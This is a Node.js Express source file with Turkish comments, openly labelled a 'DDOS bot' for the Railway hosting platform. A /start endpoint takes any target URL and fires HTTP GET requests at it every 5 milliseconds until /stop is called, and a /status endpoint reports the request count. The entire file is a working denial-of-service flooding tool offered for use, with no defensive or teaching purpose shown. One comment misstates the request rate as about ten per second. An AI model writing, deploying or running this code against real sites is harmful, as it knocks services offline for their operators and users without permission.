const express = require('express');
const http = require('http');
const https = require('https');
const { URL } = require('url');

const app = express();
const PORT = process.env.PORT || 3000;

// DDOS Durumu
let isRunning = false;
let targetUrl = "";
let requestCount = 0;
let intervalId;

// Hedefe istek gönderme fonksiyonu
function sendRequest(url) {
    const parsedUrl = new URL(url);
    const client = parsedUrl.protocol === 'https:' ? https : http;

    const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'GET',
        headers: {
            'User-Agent': 'RailwayDDOS/1.0',
            'Cache-Control': 'no-cache',
            'Accept': 'text/html, application/json'
        }
    };

    const req = client.request(options, (res) => {
        res.on('data', () => {}); // Veriyi tüket ki bağlantı açıp kalmasın
        res.on('end', () => {
            requestCount++;
            console.log(`✅ İstek Gönderildi: #${requestCount} - Durum: ${res.statusCode}`);
        });
    });

    req.on('error', (err) => {
        console.error(`❌ Hata: ${err.message}`);
    });

    req.end();
}

// DDOS Başlatma API'si
app.get('/start', (req, res) => {
    const url = req.query.url;

    if (!url) {
        return res.status(400).json({ message: "URL gerekli! Örnek: /start?url=https://ornek.com" });
    }

    if (isRunning) {
        return res.status(400).json({ message: "Zaten çalışıyor! Önce /stop yap." });
    }

    targetUrl = url;
    isRunning = true;
    requestCount = 0;

    console.log(`🚀 DDOS Başlatıldı! Hedef: ${targetUrl}`);

    // Her 100ms'de 1 istek gönder (Toplamda ~10 istek/saniye)
    intervalId = setInterval(() => {
        sendRequest(targetUrl);
    }, 5);

    res.json({ message: `DDOS Başladı! Hedef: ${targetUrl}`, status: "running" });
});

// DDOS Durdurma API'si
app.get('/stop', (req, res) => {
    if (!isRunning) {
        return res.status(400).json({ message: "Zaten durmuş." });
    }

    isRunning = false;
    clearInterval(intervalId);
    console.log(`🛑 DDOS Durduruldu! Toplam İstek: ${requestCount}`);

    res.json({ message: "DDOS Durduruldu.", totalRequests: requestCount });
});

// Durum Kontrolü
app.get('/status', (req, res) => {
    res.json({
        isRunning,
        targetUrl,
        requestCount
    });
})

// Railway'in "Dondu mu?" dememesi için basit bir ana sayfa
app.get('/', (req, res) => {
    res.send("✅ Railway DDOS Botu Çalışıyor! <br> Başlat: /start?url=... <br> Durdur: /stop");
});

// Sunucuyu başlat
app.listen(PORT, () => {
    console.log(`🖥️ Sunucu ${PORT} portunda çalışıyor...`);
});
